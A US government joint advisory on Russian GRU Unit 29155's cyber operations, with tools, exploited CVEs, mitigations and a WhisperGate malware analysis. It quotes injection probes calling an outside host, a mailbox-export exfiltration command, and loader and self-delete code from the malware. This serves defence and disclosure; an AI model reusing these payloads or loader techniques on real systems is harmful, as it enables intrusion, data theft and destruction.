Russian Military Cyber Actors Target U.S. and 
Global Critical Infrastructure 
Summary 
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and 
National Security Agency (NSA) assess that cyber actors affiliated with the Russian General Staff Main 
Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155) are responsible for computer 
network operations against global targets for the purposes of espionage, sabotage, and reputational harm 
since at least 2020. GRU Unit 29155 cyber actors began deploying the destructive WhisperGate malware 
against multiple Ukrainian victim organizations as early as January 13, 2022. These cyber actors are 
separate from other known and more established GRU-affiliated cyber groups, such as Unit 26165 and 
Unit 74455. 
To mitigate this malicious cyber activity, organizations should take the following actions today: 
 
Prioritize routine system updates and remediate known exploited vulnerabilities. 
 
Segment networks to prevent the spread of malicious activity. 
 
Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services, 
especially for webmail, virtual private networks (VPNs), and accounts that access critical systems. 
This Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit 
29155 cyber actors—both during and succeeding their deployment of WhisperGate against Ukraine—as 
well as further analysis (see Appendix A) of the WhisperGate malware initially published in the joint 
advisory, Destructive Malware Targeting Organizations in Ukraine, published February 26, 2022.

Technical Details 
Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 15. See the MITRE 
ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK 
tactics and techniques. 
GRU Unit 29155: Cyber Component 
FBI, NSA, and CISA assess Unit 29155 is responsible for attempted coups, sabotage and influence 
operations, and assassination attempts throughout Europe. Unit 29155 expanded their tradecraft to 
include offensive cyber operations since at least 2020. Unit 29155 cyber actors’ objectives appear to 
include the collection of information for espionage purposes, reputational harm caused by the theft and 
leakage of sensitive information, and systematic sabotage caused by the destruction of data [T1485]. 
FBI assesses the Unit 29155 cyber actors to be junior active-duty GRU officers under the direction of 
experienced Unit 29155 leadership. These individuals appear to be gaining cyber experience and 
enhancing their technical skills through conducting cyber operations and intrusions. Additionally, FBI 
assesses Unit 29155 cyber actors rely on non-GRU actors, including known cyber-criminals and enablers to 
conduct their operations.

Cybersecurity Industry Tracking 
The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation 
recommendations related to Unit 29155 cyber actors. While not all encompassing, the following are the 
most notable threat group names related under MITRE ATT&CK G1003 and commonly used within the 
cybersecurity community. 
 
Cadet Blizzard (formerly known as DEV-0586 by Microsoft)[1],[2] 
 
Ember Bear (also known as Bleeding Bear by CrowdStrike)[3] 
 
Frozenvista 
 
UNC2589[4] 
 
UAC-0056[5] 
Note: Cybersecurity companies have different methods of tracking and attributing cyber actors, and this 
may not be a 1:1 correlation to the U.S. Government’s understanding for all activity related to these 
groupings. 
Victimization 
In addition to WhisperGate and other incidents against Ukraine, Unit 29155 cyber actors have conducted 
computer network operations against numerous members of the North Atlantic Treaty Organization (NATO) 
in Europe and North America, as well as countries in Europe, Latin America, and Central Asia. The activity 
includes cyber campaigns such as website defacements, infrastructure scanning, data exfiltration, and 
data leak operations. These actors sell or publicly release exfiltrated victim data obtained from their 
compromises. Since early 2022, the primary focus of the cyber actors appears to be targeting and 
disrupting efforts to provide aid to Ukraine. 
To date, the FBI has observed more than 14,000 instances of domain scanning across at least 26 NATO 
members and several additional European Union (EU) countries. Unit 29155 cyber actors have defaced 
victim websites and used public website domains to post exfiltrated victim information. 
Whether through offensive operations or scanning activity, Unit 29155 cyber actors are known to target 
critical infrastructure and key resource sectors, including the government services, financial services, 
transportation systems, energy, and healthcare sectors of NATO members, the EU, Central American, and 
Asian countries. 
TTP Overview 
Reconnaissance 
Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple 
government and critical infrastructure organizations. The following are publicly available tools these cyber 
actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not 
observed using these tools outside of their intended purpose. Note: Use of these tools should not be 
attributed as malicious without analytical evidence to support threat actor use and/or control. 
 
Acunetix: Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, 
services, and vulnerabilities for networks [T1595.002].[6]

TLP:CLEAR 
 
 
TLP:CLEAR 
 
 
Amass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for 
target websites [T1590.002].[7] 
 
Droopescan[8] 
 
JoomScan[9] 
 
MASSCAN: Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once 
inside victim networks.[10] 
 
Netcat[11] 
 
Nmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used 
Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning 
other machines [T1046]. 
 
Shodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities 
or device types [T1596.005].[12] 
 
VirusTotal[13] 
 
WPScan 
Additionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration 
[T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in 
combination with Impacket and ldapdomaindump were tools used for gathering information on AD. Once 
active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the 
Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities 
such as blind cross-site scripting, as shown in the following commands: 
GET /index.php?log=to@example.com>%0d%0abcc:009247.3183-
377.3183.1bf6c.19446.2@bxss.me 
"GET /CMS/files/log.htm HTTP/1.1" * * "(nslookup hitccruvbrumn76c1b.bxss.me||perl 
-e \"gethostbyname('hitccruvbrumn76c1b.bxss.me')\")" 
As the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim 
web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against 
victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective 
exploit scripts for, but not exploiting, the following CVEs: 
 
CVE-2020-1472 (Microsoft: Windows Server) 
 
CVE-2021-26084 (Atlassian Confluence Server and Data Center) 
 
CVE-2021-3156 (Red Hat: Privilege Escalation via Command Line Argument Parsing) 
 
CVE-2021-4034 (Red Hat: Polkit Privilege Escalation) 
 
CVE-2022-27666 (Red Hat: Heap Buffer Overflow Flaw) 
Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as 
detailed throughout this advisory: 
 
CVE-2021-33044 (Dahua Security) 
 
CVE-2021-33045 (Dahua Security)

 
CVE-2022-3236 (Sophos: Firewall) 
Resource Development 
Rather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and 
publicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other 
cyber actors, which can lead to misattribution. 
Unit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this 
has provided the opportunity to obtain various hacker tools such as malware and malware loaders 
[T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their 
use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical 
analysis can be found in Appendix A: WhisperGate Malware Analysis. 
Initial Access 
Unit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors 
commonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially 
access networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-2021-
33045 on Dahua IP cameras to bypass identity authentication. 
Lateral Movement 
Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation 
scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating 
images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to 
vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in 
plaintext (as shown in Table 1 below) [T1552.001]. 
Appendix B: Indicators of Compromise lists threat actor IP addresses associated with the activity detailed in 
this section.

In addition, incident analysis identified the general observations listed below on victim infrastructure. Each 
event should be considered independent and may have been used by Unit 29155 cyber actors against 
multiple victims at different dates and timeframes. Appendix B: Indicators of Compromise lists IOCs 
associated with the observations in Table 1 and below. 
 
In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors 
exfiltrated data to mega[.]nz using Rclone [T1567.002]. 
 
Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains. 
 
Cyber actors performed SSH and SSHPass executions.

FBI | CISA | NSA | et. al 
TLP:CLEAR 
 
 
TLP:CLEAR 
 
 
Cyber actors initiated a web request and executed commands via ProxyChains. This included 
obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows 
Management Instrumentation (WMI) with hashes, and making web requests with resources i.php 
and tunnel.jsp. In one instance, cyber actors used smbclient via ProxyChains to access internal 
network shares, and subsequently PSQL and MySQL clients to access internal databases.  
 
Cyber actors used Impacket for post-exploitation and lateral movement. The script 
secretsdump.py was used from the Impacket framework to obtain domain credentials, while 
psexec.py was subsequently used to move laterally within a victim network.  
 
Cyber actors used ntlmrelayx.py via Impacket and krbrelayx.py, which requires Impacket to 
function. 
 
Cyber actors used Responder.py. 
 
Cyber actors used su-bruteforce to brute force a selected user using the su command. 
 
Cyber actors used BloodHound, an open source AD reconnaissance tool that can reveal hidden 
relationships and identify attack paths within an AD environment. 
 
Cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP 
addresses. This open source post-exploitation tool automates assessing the security of large AD 
networks. 
 
Cyber actors used LinPEAS, an open source script designed to automate the process of searching 
for potential privilege escalation vulnerabilities on a Linux victim. 
 
Cyber actors used GO Simple Tunnel (GOST) (MD5: 896e0f54fc67d72d94b40d7885f10c51) for 
30 days within one incident and against additional victims on various occasions. GOST is a 
tunneling tool designed to establish secure connections between clients and servers, allowing for 
secure data transmission over untrusted networks. 
 
Cyber actors used Through the Wire against a victim’s internet-facing Confluence server. Through 
the Wire is a proof of concept[14] exploit for CVE-2022-26134, an OGNL injection vulnerability 
allowing an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center 
instance. All versions of Confluence Server and Data Center prior to the fixed versions listed by 
Atlassian are affected by this vulnerability.[15] A reverse shell over HTTPS was used to 
communicate over listening host on port 8081. 
 
Cyber actors initiated Nmap scans on localized web servers. 
 
Cyber actors performed lateral movement from compromised web servers to exploit a corporate 
Microsoft Windows network, commonly using psexec.py from the Impacket framework. The script 
secretsdump.py from the Impacket framework was used to obtain domain credentials. 
 
Cyber actors may have used Raspberry Robin malware in the role of an access broker [T1588.001]. 
 
Cyber actors targeted victims’ Microsoft Outlook Web Access (OWA) infrastructure with password 
spraying to obtain valid usernames and passwords [T1110.003].

Command and Control 
Infrastructure 
Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [T1583.003] to host 
their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data. Use 
of VPSs are common due to the associated IP addresses not identifying their true country of origin. 
Post-Exploitation 
When an exploit is successfully executed on a victim system, the actors can then launch a Meterpreter 
payload [T1105], which commonly uses a reverse Transmission Control Protocol (TCP) connection to 
initiate communication with the threat actors’ infrastructure [T1095]. In one instance, an established 
reverse TCP session was observed from victim to actor infrastructure via the following ports: 
 
1234 
 
1851 
 
43221 
 
443 
 
4444 
 
4688 
 
5432 


 
8089 
 
8090 
 
8443 
 
8487 
 
8888 
Additional observations were collected from victim engagement and analysis, including: 
 
Use of the Metasploit Framework to search for and/or access modules such as mysql, postgres, 
and ssh software and features. 
 
Use of Meterpreter and Netcat to execute reverse shells over ports such as 8081. 
 
Use of Impacket. 
 
Use of PHP (exp_door v1.0.2, b374k, WSO 4.0.5) and the P.A.S. web shells [T1505.003], likely 
for initial access. 
 
Use of EternalBlue.[16],[17] 
 
Use of reGeorg or Neo-reGeorg to set up a proxy to tunnel network traffic following compromise of a 
victim website, as well as use of ProxyChains to run Nmap within the network. 
Encrypted Communication 
Once Unit 29155 cyber actors gain access to the victims’ internal network, the victims have observed: 
1. Using Domain Name System (DNS) tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 
network traffic [T1071.004]. For example, Iodine was used to tunnel data via 
dns.test658324901domain.me. 
2. Configuring a proxy within the victim infrastructure and executing commands within the network via 
ProxyChains. ProxyChains—a tool used to route internal traffic through a series of proxies 
[T1090.003]—has been used to provide further anonymity and modify system configuration to force

Exfiltration 
In several instances, analysis identified Unit 29155 cyber actors compressing victim data [T1560] (e.g., the 
entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their 
infrastructure. These cyber actors commonly use the command-line program Rclone to exfiltrate data to a 
remote location from victim infrastructure. 
Unit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority 
Subsystem Service (LSASS) memory dumps [T1003.001], Security Accounts Manager (SAM) files 
[T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response 
results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate 
mail artifacts, such as email messages, using PowerShell [T1059.001] via the following command: 
powershell New-MailboxExportRequest – Mailbox <resource> – FilePath `\\{IP 
Address}\sharefolder\1.pst`

Mitigations 
The authoring agencies recommend organizations implement the mitigations supplied below to improve 
organizational cybersecurity posture based on threat actor activity. These mitigations align with the Cross-
Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards 
and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST 
recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity 
frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, 
and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the 
CPGs, including additional recommended baseline protections.

Limit Adversarial Use of Common Vulnerabilities 
 
Prioritize patching to CISA’s Known Exploited Vulnerabilities Catalog, especially for CVEs identified 
in this advisory, and then critical and high vulnerabilities that allow for remote code execution on 
internet-facing devices. 
 
Conduct regular automated vulnerability scans to perform vulnerability assessments on all network 
resources based on threat actor behaviors and known exploitable vulnerabilities (CISA CPG 1.E). 
 
Limit exploitable services on internet-facing assets, such as email and remote management 
protocols (CISA CPGs 2.M, 2.W). Where necessary services must be exposed, such as services 
hosted in a demilitarized zone (DMZ), implement the appropriate compensatory controls to prevent 
common forms of abuse and exploitation. Disable all unnecessary operating system applications 
and network protocols to combat adversary enumeration. For additional guidance, see CISA 
Insights: Remediate Vulnerabilities for Internet-Accessible Systems. 
 
U.S. organizations can utilize a range of CISA services at no cost, including vulnerability scanning 
and testing, to help organizations reduce exposure to threats. CISA Cyber Hygiene services can 
provide additional review of internet-accessible assets and provide regular reports on steps to take 
to mitigate vulnerabilities. Email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber 
Hygiene Services,” to get started. 
 
Software manufacturers, vendors, and consumers are encouraged to review CISA and NIST’s 
Defending Against Supply Chain Attacks. This publication provides an overview of software supply 
chain risks and recommendations for how software customers and vendors can use the NIST Cyber 
Supply Chain Risk Management (C-SCRM) Framework and the Secure Software Development 
Framework (SSDF) to identify, assess, and mitigate software supply chain risks. CISA recommends 
comprehensive mitigations for supply chain incident reporting, vulnerability disclosing (e.g., 
security.txt), and choosing a trusted supplier or vendor that observes proper cyber security hygiene 
(CISA CPG 1.G, 1.H, 1.I) to defend against upstream attacks. 
Deploy Protective Controls and Architecture 
 
Implement network segmentation. Network segmentation can help prevent lateral movement by 
controlling traffic flows between—and access to—various subnetworks (CISA CPG 2.F). Best practice 
mitigations include updating Identity and Access Management (IAM) and employing phishing-
resistant MFA for all devices and accounts identified as organizational assets. For additional 
guidance, see CISA and NSA’s IAM Recommended Best Practices Guide for Administrators (CISA 
CPG 2.H). 
 
Verify and ensure that sensitive data, including credentials, are not stored in plaintext and can only 
be accessed by authenticated and authorized users. Credentials must be stored in a secure 
manner, such as with a credential/password manager to protect from malicious enumeration (CISA 
CPG 2.L). 
 
Disable and/or restrict use of command line and PowerShell activity. Update to the latest version 
and uninstall all earlier PowerShell versions (CISA CPG 2.N). 
 
 
 
Page 17 of 36  |  Product ID: AA24-249A 
FBI | CISA | NSA | et. al 
TLP:CLEAR 
 
 
TLP:CLEAR 
 
 
Implement a continuous system monitoring program, such as security information and event 
management (SIEM) or endpoint detection and response (EDR) solutions, to comprehensively log 
and review all authorized external access connections. This logging will better ensure the prompt 
detection of misuse or abnormal activity (CISA CPG 2.T). 
 
Monitor for unauthorized access attempts and programming anomalies through comprehensive 
logging that is secured from modification, such as limiting permissions and adding redundant 
remote logging (CISA CPG 2.U). Security appliances should be set to detect and/or block Impacket 
framework indicators, PSExec or WMI commands, and suspicious PowerShell commands for timely 
identification and remediation. 
 
Identify any use of outdated or weak encryption, update these to sufficiently strong algorithms, and 
consider the implications of post-quantum cryptography (CISA CPG 2.K). Use properly configured 
and up-to-date Secure Socket Layer (SSL)/Transport Layer Security (TLS) to protect data in transit. 
Security Controls 
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating 
your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for 
Enterprise framework in this advisory. The authoring agencies recommend testing your existing security 
controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Table 3 to Table 14). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the data 
generated by this process. 
The authoring agencies recommend continually testing your security program, at scale, in a production 
environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this 
advisory.

Appendix A: WhisperGate Malware Analysis 
Overview 
This technical analysis details the WhisperGate malware deployed against Ukraine; samples were collected 
from one victim and analyzed. The analysis provides insight into Unit 29155 cyber actor infrastructure used 
for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in 
Europe and North America, and countries in Latin America and Central Asia. 
Unit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, stage1.exe 
and stage2.exe. WhisperGate has two stages that corrupts a system’s master boot record, displays a 
fake ransomware note, and encrypts files based on certain file extensions (see AA22-057A). The actors 
used multiple Discord accounts to store malware files, including what appears to be development versions 
or iterations of the binaries. Discord is commonly leveraged by threat actors as an endpoint for malware 
distribution and control; in this case, it was used to obtain the next step of the infection chain by directly 
sharing files through its platform. In the case of stage2.exe, the binary communicated with Discord to 
obtain Tbopbh.jpg—the malicious payload that is in-memory loaded and performs the destructive 
capabilities.[18] 
Categorization 
The Discord accounts associated with the WhisperGate campaign are categorized into three main clusters, 
labeled below as Clusters 1, 2, and 3. All clusters used Discord as a staging environment for malware 
deployment. These groupings are based on analysis of threat actor IP addresses and the nature of the 
malware that existed within the accounts. The following sections include notable details found within each 
cluster. 
Cluster 1 
Cluster 1 contained the following files: 
 
hxxps://cdn.discordapp[.]com/attachments/928503440139771947/9301086376811847
68/Tbopbh.jpg (a resource, e.g., payload, for stage2.exe)[18] 
 
saint.exe (a downloader, SaintBot, as detailed by CERT-UA)[19] 
 
puttyjejfrwu.exe[19] 
Cluster 2 
Cluster 2 contained: 


zip files via Discord links)[20] 
 
Several Microsoft Word documents with macros that download test01.exe from 3237.site. 
Once executed, test01.exe downloads load2022.exe from smm2021.net.

stage2.exe used the reflection library to call method Ylfwdwgmpilzyaph from the loaded 
Assembly object. 
 
stage2.exe contained decryption logic that resembled RC4, a C# class produced a base64 string 
and an encryption class which created a key using the decoded string. The encryption class used 
encryption logic every 32 bytes to decrypt. Additionally, the XOR functionality occurred using the 
initialized byte “Array” shown below. The encryption class resembled RC4; it was used every 32 
bytes. The base64 string came from a class that contained EazFuscator logic to obfuscate code by 
eliminating control flow within code, as well as making symbols difficult to analyze: 
o byte[] array = new byte[] {148, 68, 208, 52, 241, 93, 195, 220}; 
 
stage2.exe contained EazFuscator class logic. This included logic that built strings during 
runtime; otherwise, the full strings would have been obfuscated and further segmented when 
viewed statically. The following is an example of a built string: 
o UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==

When the above string was base64 decoded, the system displayed the following PowerShell 
command: Start-Sleep -s 10 
 
stage2.exe served as the downloader and driver logic for the malware payload, Tbopbh.jpg. 
Tbopbh.jpg (payload for stage2.exe variant) 
An account in Discord Cluster 1 contained malware with the following hashes, labeled as Tbopbh.jpg: 
 
MD5: b3370eb3c5ef6c536195b3bea0120929 
 
SHA-256: 923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6 
When viewing payload Tbopbh.jpg using a hex editor, it ended with value “ZM” or hex values “5A 4D”—
this indicated the payload was a reversed PE. Reversing the bytes of Tbopbh.jpg revealed the hashes of 
the resulting payload listed in Table 20 below.

stage2.exe was observed calling method Ylfwdwgmpilzyaph to begin decrypting resource 
78c855a088924e92a7f60d661c3d1845. The reflection library was used to execute method 
Ylfwdwgmpilzyaph, as shown in the following C# code block: 
using System.Reflection; 
string path = "Frkmlkdkdubkznbkmcf.dll"; 
string fqpn = Path.GetFullPath(path); 
Assembly assembly = Assembly.LoadFile(fqpn); 
Type type = assembly.GetType("ClassLibrary1.Main"); 
type.InvokeMember("Ylfwdwgmpilzyaph", BindingFlags.InvokeMethod, null, null, 
null); 
The following application configuration accompanied the above code block to allow loading from remote 
sources: 
<?xml version="1.0" encoding="utf-8" ?> 
<configuration> 
<runtime> 
<loadFromRemoteSources enabled="true"/> 
</runtime> 
</configuration> 
Upon invoking the method Ylfwdwgmpilzyaph, Nmddfrqqrbyjeygggda.vbs wrote to the Windows 
%TEMP% directory and has the following attributes, as listed in Table 22 below.

The VBS code listed in Table 22 used a WScript shell that executed as a Windows application, which ran a 
PowerShell command to exclude the C:\ drive from Windows Defender's security checks. Malware analysts 
decoded and decrypted one of the resources from Frkmlkdkdubkznbkmcf.dll 
(78c855a088924e92a7f60d661c3d1845). Further analysis of Frkmlkdkdubkznbkmcf.dll resulted in

The reversed and decompressed Waqybg files contained file corruption logic along with a final command to 
ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & 
Del /f /q “%s”. Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys 
files with specific extensions.[19],[21] 
The following file extensions listed in Table 25 were targeted for file corruption with the equivalent of the 
“wcscmp” C function logic (a string compare function). The corruption logic included overwriting 0x100000 
or 1 MB worth of 0xcc values per targeted file.

Malware Related to Tbopbh.jpg 
stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within 
Discord Cluster 1. While most of these other malware files have not been observed in open source 
reporting, malware analysts assess them as payloads that follow the unravelling process listed in Figure 1 
below. 
 
Figure 1: stage2.exe Execution Process Template 
Table 26 below provides a list of MD5 hashes for files found within Discord Cluster 1. When reversed, 
these files become DLL files, which were structured similarly to Frkmlkdkdubkznbkmcf.dll. 
Table 26: Files Located in Discord Cluster 1 
Note: Analysts identified the files below in Discord Cluster 1; the files are staged on the Cluster in reversed 
byte order. Analysts reversed the file byte order for each file into their proper portable executable format, 
e.g., “Functional” format. The hashes in Table 26 represent both byte orders.
